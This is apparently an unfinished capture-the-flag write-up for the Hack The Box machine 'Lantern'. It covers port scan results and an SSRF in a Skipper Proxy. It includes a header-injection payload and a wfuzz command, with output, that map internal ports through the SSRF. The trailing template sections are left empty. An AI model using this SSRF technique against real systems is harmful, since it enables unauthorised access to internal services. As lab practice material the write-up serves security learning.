## Linux Hard Machine Lantern

- [+] :	Target IP
   >>	10.129.235.127
   
   
## Recon

|PORT|     |STATE| |SERVICE|
|22/tcp|   |open|  |ssh|
|80/tcp|  |open|  |http|
|3000/tcp| |open|  |ppp|

>> We can Post a pdf or whatever if we modify the name of the file as .pdf 

- [+] :	VHOST Enum 
   >>	0 subdomain

- [+] :	Code source recon
   >>	author = Devcrud

- [+] :	Webservers
   >>	port 80 webserver: Skipper Proxy (Vulnerable)
   >>	port 3000 webserver: kestrel

------------------------
## Foothold 
port 80 webserver is vulnerable to SSRF https://www.exploit-db.com/exploits/51111


Proof Of Concept:

1- Add header "X-Skipper-Proxy"  to your request
2- Add the aws metadata to the path (no need to do this for our scenario)

X.Skipper-Proxy: http://localhost:§payload_intruder§

or wfuzz it for more speed of response 
```bash
wfuzz --hc 503 -c -z file,"/usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt" -t 100  -H "X-Skipper-Proxy: http://localhost:FUZZ" http://lantern.htb/
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://lantern.htb/
Total requests: 10000

=====================================================================
ID           Response   Lines    Word       Chars       Payload        
=====================================================================

000000023:   500        1 L      3 W        22 Ch       "0022"         
000000081:   200        224 L    836 W      12049 Ch    "0080"         
000003001:   200        57 L     117 W      2854 Ch     "3000"         
000005001:   200        49 L     123 W      1669 Ch     "5000"         
000008001:   200        224 L    836 W      12049 Ch    "8000"  
```
so we can check it manually in burpsuite 

port 8000 and 80 seems to be our main lantern.htb page , port 3000 and 5000 and the .net core web app 

So Im thinking that i could read the dlls through the port 5000 , since its not exposed to the internet (in the scenario) so it the local port of the webapp

It must have some intersting dll that I could decompile 


- [+] :	
   >>	
   

- [+] :	Target IP
   >>	
   

- [+] :	Target IP
   >>	
   

- [+] :	Target IP
   >>	
   

- [+] :	Target IP
   >>	
   

